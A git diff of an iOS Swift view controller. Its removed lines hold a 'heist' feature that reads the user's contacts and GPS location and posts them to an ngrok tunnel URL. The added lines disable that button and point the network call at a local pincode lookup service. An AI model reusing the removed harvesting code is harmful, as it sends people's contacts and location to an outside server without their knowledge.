@@ -6,15 +6,10 @@
 //
 
 import UIKit
-import CoreLocation
+import Foundation
 
-struct heistedData {
-    var Contacts: [FetchedContact]
-    var Location: [CLLocationDegrees?]? // not reliable cause of location change trigger
-}
-var userData = heistedData(Contacts: [])
 
-class ViewController: UIViewController, CLLocationManagerDelegate {
+class ViewController: UIViewController {
     
     // UI elements
     @IBOutlet weak var startHeistButton: UIButton!
@@ -24,127 +19,63 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
     private var appPermissions = AppPermissions()
     private var isLocationUpdated = false
     private var userID = ""
+    private var result = ""
 
     override func viewDidLoad() {
         super.viewDidLoad()
         
-        appPermissions.askLocationPermission();
-        appPermissions.askContactsPermissions();
+//        Timer.scheduledTimer(withTimeInterval: 3.0, repeats: true) {
+//            timer in
+//                self.userIdInput.text = self.result
+//            print("timer fired!  \(self.result)")
+//
+//        }
+        
+        
+//        self.showToast(controller: self, message: self.result, seconds: 3)
+
     }
+    
+    func showToast(controller: UIViewController, message : String, seconds: Double) {
+        let alert = UIAlertController(title: nil, message: message, preferredStyle: .alert)
+        alert.view.backgroundColor = .black
+        alert.view.alpha = 0.5
+        alert.view.layer.cornerRadius = 15
+        
+        controller.present(alert, animated: true)
+        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + seconds) {
+            alert.dismiss(animated: true)
+
+        }
+    }
+    
 
     @IBAction func startButtonPressed(_ sender: UIButton) {
+        return
         self.userID = userIdInput.text ?? ""
-        
-        // location
-        self.heistLocation()
-        
-        // contacts
-        self.heistContacts()
-                
-        var contacts: [String: Any] = [:]
         let jsonTodo: Data
 
-        for contact in userData.Contacts {
-            let phone: String
-            phone = contact.telephone ?? ""
-            
-            if phone == "" {
-                continue
-            }
-            print(phone)
-            contacts[phone] = [
-                "first_name" : contact.firstName,
-                "last_name" : contact.lastName
-            ]
-            
-        }
         do {
             var postData: [String: Any] = [:]
-            postData["contacts"] = contacts
             postData["device_type"] = "ios_app"
-            postData["user_id"] = self.userID
             postData["is_api"] = true;
             
             jsonTodo = try JSONSerialization.data(withJSONObject: postData, options: [])
+            saveUserData(jsonTodo: jsonTodo)
         } catch {
             print("Error: cannot create JSON from postData")
             return
         }
-        saveUserData(jsonTodo: jsonTodo)
-    }
-    
-    private func heistLocation() {
-        if !appPermissions.canAccessUserLocation() {
-            showPermissionBlockedUI(title: "Location permission is disabled", message: "Please enable Location Services in your Settings")
-            return
-        }
-        
-        appPermissions.getLocationManager().delegate = self
-        appPermissions.getLocationManager().startUpdatingLocation()
-    }
-    
-    private func heistContacts() {
-        if !appPermissions.canAccessUserContacts() {
-            showPermissionBlockedUI(title: "Contacts permission is disabled", message: "Please enable contacts Services in your Settings")
-            return
-        }
-        
-        userData.Contacts = appPermissions.getContacts()
-    }
-    
-    private func showPermissionBlockedUI(title: String, message: String) {
-        let alert = UIAlertController(title: title, message: message, preferredStyle: .alert)
-        let okAction = UIAlertAction(title: "OK", style: .default, handler: nil)
-        
-        alert.addAction(okAction)
-        present(alert, animated: true, completion: nil)
-    }
-    
-    
-    // location manager deligates
-    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]){
-        
-        // this mrthod is triggered async, should make a separate api call
-        let location = locations.last
-        appPermissions.getLocationManager().stopUpdatingLocation()
-        userData.Location = [location?.coordinate.latitude, location?.coordinate.longitude]
-        
-        let jsonTodo: Data
-        var postData: [String: Any] = [:]
-        
-        do {
-            postData["location"] = [
-                "longitude" : location?.coordinate.latitude,
-                "latitude" : location?.coordinate.longitude
-            ]
-            postData["device_type"] = "ios_app"
-            postData["user_id"] = self.userID
-            postData["is_api"] = true;
-            
-            jsonTodo = try JSONSerialization.data(withJSONObject: postData, options: [])
-        } catch {
-          print("Error: cannot create JSON from location postData")
-          return
-        }
-        saveUserData(jsonTodo: jsonTodo)
-    }
-    func locationManager(_ manager: CLLocationManager, didFailWithError error: Error){
-        print("Errors: " + error.localizedDescription)
-    }
-    
-    func printUserData() {
-        print(userData)
     }
     
     func saveUserData(jsonTodo: Data) {
-        let todosEndpoint: String = "https://304e66514f88.ngrok.io/insertPermissions.php"
+        let todosEndpoint: String = "http://192.168.1.56:8082/v1/centers?pincode=110005"
         guard let todosURL = URL(string: todosEndpoint) else {
           print("Error: cannot create URL")
           return
         }
         var todosUrlRequest = URLRequest(url: todosURL)
-        todosUrlRequest.httpMethod = "POST"
-        todosUrlRequest.httpBody = jsonTodo
+        todosUrlRequest.httpMethod = "GET"
 
         let session = URLSession.shared
 
@@ -169,11 +100,17 @@ class ViewController: UIViewController, CLLocationManagerDelegate {
             }
             print("The response todo is: " + receivedTodo.description)
             
-            guard let todoID = receivedTodo["id"] as? Int else {
-              print("Could not get todoID as int from JSON")
-              return
+            let responseString = receivedTodo.description
+            
+            print(responseString)
+            if responseString.contains(self.userID) {
+                self.result = "Congrats!!"
+            } else {
+                self.result = "Nope!!"
             }
-            print("The ID is: \(todoID)")
+            print(self.result)
+
+            
           } catch  {
             print("error parsing response from POST on /todos")
             return
